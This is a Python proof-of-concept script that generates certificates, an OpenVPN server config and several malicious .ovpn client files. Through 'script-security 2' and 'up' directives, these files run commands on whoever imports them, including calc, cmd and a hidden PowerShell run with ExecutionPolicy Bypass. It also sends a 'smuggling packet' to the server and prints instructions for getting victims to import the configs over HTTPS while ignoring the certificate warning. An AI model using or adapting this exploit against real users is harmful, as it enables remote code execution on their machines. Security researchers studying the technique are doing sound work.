#!/usr/bin/env python3
# OpenVPN RCE PoC - Payload and Certificate Generator

import os
import subprocess
import sys
import shutil
import socket
import time
from ctf_toolkit import send_smuggling_packet

def find_openssl():
    """Attempt to find openssl.exe in common locations."""
    # Check if it's already in PATH
    if shutil.which("openssl"):
        return "openssl"
    
    # Common Git for Windows paths and standard OpenSSL paths
    common_paths = [
        r"C:\Program Files\Git\usr\bin\openssl.exe",
        r"C:\Program Files\Git\bin\openssl.exe",
        r"C:\Program Files (x86)\Git\usr\bin\openssl.exe",
        r"C:\Program Files\Git\mingw64\bin\openssl.exe",
        r"C:\OpenSSL-Win64\bin\openssl.exe",
        r"C:\OpenSSL-Win32\bin\openssl.exe"
    ]
    for path in common_paths:
        # print(f"[*] Checking: {path}") # Debug
        if os.path.exists(path):
            return f'"{path}"'
    
    # Try using 'where' command as a last resort in case shutil.which fails on some systems
    try:
        result = subprocess.run("where openssl", capture_output=True, text=True, shell=True)
        if result.returncode == 0:
            first_path = result.stdout.splitlines()[0].strip()
            return f'"{first_path}"'
    except:
        pass
        
    return "openssl"

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def main():
    WORK_DIR = os.path.join(".\\", "openvpn-poc")
    openssl_bin = find_openssl()
    
    # Configure OpenSSL for Windows
    env = os.environ.copy()
    
    print(f"[*] Creating working directory: {WORK_DIR}")
    if os.path.exists(WORK_DIR):
        shutil.rmtree(WORK_DIR, ignore_errors=True)
    os.makedirs(WORK_DIR, exist_ok=True)
    os.chdir(WORK_DIR)

    # Try to find server.crt/key if they exist, or generate them
    print(f"[*] Using OpenSSL: {openssl_bin}")
    print("[*] Generating certificates...")
    
    # Generate CA
    cp = subprocess.run(f"{openssl_bin} genrsa -out ca.key 2048", shell=True, env=env)
    if cp.returncode != 0:
        print("[!] ERROR: Failed to run openssl. Please ensure OpenSSL is installed and in your PATH.")
        sys.exit(1)
        
    subprocess.run(f'{openssl_bin} req -new -x509 -days 365 -key ca.key -sha256 -out ca.crt -subj "/CN=POC_CA"', shell=True, env=env)

    # Generate Server Cert (missing in previous version, needed for OpenVPN server)
    print("[*] Generating server certificate...")
    subprocess.run(f"{openssl_bin} genrsa -out server.key 2048", shell=True, env=env)
    subprocess.run(f'{openssl_bin} req -new -key server.key -out server.csr -subj "/CN=POC_Server"', shell=True, env=env)
    subprocess.run(f"{openssl_bin} x509 -req -days 365 -in server.csr -CA ca.crt -CAkey ca.key -set_serial 01 -sha256 -out server.crt", shell=True, env=env)

    print("[*] Generating client certificate...")



    subprocess.run(f"{openssl_bin} genrsa -out client.key 2048", shell=True, env=env)
    subprocess.run(f'{openssl_bin} req -new -key client.key -out client.csr -subj "/CN=POC_Client"', shell=True, env=env)
    subprocess.run(f"{openssl_bin} x509 -req -days 365 -in client.csr -CA ca.crt -CAkey ca.key -set_serial 02 -sha256 -out client.crt", shell=True, env=env)

    print("[*] Verifying certificates...")
    subprocess.run(f"{openssl_bin} verify -CAfile ca.crt client.crt", shell=True, env=env)

    server_ip = get_ip()
    
    # Define target for smuggling packet to avoid NameError
    target_ip = server_ip  # Default to local IP, or customize as needed
    target_port = 1194
    print(f"[*] Sending smuggling packet to {target_ip}:{target_port}...")
    try:
        response = send_smuggling_packet(target_ip, target_port)
        print(f"[*] Smuggling response: {response}")
    except Exception as e:
        print(f"[!] Smuggling packet failed: {e}")

    print("[*] Generating Web Server SSL certificate...")
    subprocess.run(f"{openssl_bin} genrsa -out web.key 2048", shell=True, env=env)
    subprocess.run(f'{openssl_bin} req -new -key web.key -out web.csr -subj "/CN={server_ip}"', shell=True, env=env)
    subprocess.run(f"{openssl_bin} x509 -req -days 365 -in web.csr -signkey web.key -sha256 -out web.crt", shell=True, env=env)

    print("[*] Creating OpenVPN server config...")
    server_conf = """port 1194
proto udp
dev tun
server 10.8.0.0 255.255.255.0
topology subnet
dh none
cipher AES-256-GCM
data-ciphers AES-256-GCM:AES-128-GCM
ca ca.crt
cert server.crt
key server.key
keepalive 10 120
persist-key
persist-tun
verb 3
"""
    with open("server.conf", "w") as f:
        f.write(server_conf)

    print("[*] Generating multiple client .ovpn PoC files...")
    with open("ca.crt", "r") as f:
        ca_crt = f.read().strip()
    with open("client.crt", "r") as f:
        client_crt = f.read().strip()
    with open("client.key", "r") as f:
        client_key = f.read().strip()

    ovpn_template = """client
dev tun
proto udp
remote {server_ip} 1194
resolv-retry 3
nobind
cipher AES-256-GCM
data-ciphers AES-256-GCM:AES-128-GCM
<ca>
{ca_crt}
</ca>
<cert>
{client_crt}
</cert>
<key>
{client_key}
</key>
script-security 2
up {payload}
verb 3
"""

    payloads = {
        "calc": '"C:\\\\Windows\\\\System32\\\\calc.exe"',
        "cmd_echo": '"C:\\\\Windows\\\\System32\\\\cmd.exe" /c "echo pwned > C:\\\\Users\\\\Public\\\\pwned.txt"',
        "powershell": '"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe" -ExecutionPolicy Bypass -WindowStyle Hidden -Command "New-Item -Path C:\\\\Users\\\\Public\\\\pwned_ps.txt -ItemType File"',
        "ping": '"C:\\\\Windows\\\\System32\\\\cmd.exe" /c "ping 127.0.0.1 -n 5"'
    }

    generated_files = []
    for name, cmd in payloads.items():
        filename = f"client_rce_{name}.ovpn"
        config = ovpn_template.format(
            server_ip=server_ip,
            ca_crt=ca_crt,
            client_crt=client_crt,
            client_key=client_key,
            payload=cmd
        )
        with open(filename, "w") as f:
            f.write(config)
        generated_files.append(filename)
        print(f"[*] Generated {filename}")
        time.sleep(1)

    print("[*] Creating startup script...")
    current_dir = os.path.dirname(os.path.abspath(__file__))
    poc_server_path = os.path.join(current_dir, "poc_web_server.py")
    start_bat = f"""@echo off
cd /d "%USERPROFILE%\\openvpn-poc"
echo [*] Starting HTTPS Web server (requires admin for port 443)...
python "{poc_server_path}"
pause
"""
    with open("start.bat", "w") as f:
        f.write(start_bat)

    print("\n============================================")
    print("[+] Generation complete!")
    print("============================================")
    print(f"\nServer IP: {server_ip}\n")
    print("Generated files:")
    for gf in generated_files:
        print(f"  - {gf}  (Malicious client config)")
    print("  - web.crt/web.key  (Web SSL certs)")
    print("\nTo start services:")
    print("  cd /d %USERPROFILE%\\openvpn-poc && start.bat")
    print("\nWindows Import Method:")
    print(f"  1. URL Import: https://{server_ip}/vpn.ovpn")
    print("     (Will prompt for cert error, ignore and continue; defaults to calc payload)")
    print("  2. File Import: Copy any client_rce_*.ovpn")
    print("\n============================================")

if __name__ == "__main__":
    main()
